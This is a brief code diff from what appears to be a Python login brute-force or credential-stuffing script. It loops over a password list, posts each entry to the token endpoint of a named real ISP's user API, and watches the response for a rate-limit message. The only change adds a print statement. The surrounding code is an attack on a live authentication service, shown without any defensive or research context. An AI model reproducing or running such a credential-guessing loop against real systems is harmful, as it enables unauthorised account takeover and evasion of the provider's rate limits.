@@ -21,6 +21,7 @@ for line in passinpot:
   http = requests.post('https://ubapi.earthlink.iq/api/user/Token', data=data)
 
   print(http.text)
+  print(a)
   if 'Too many !' in http.text:
      
      print("loading ... .>>>^^^^^^")
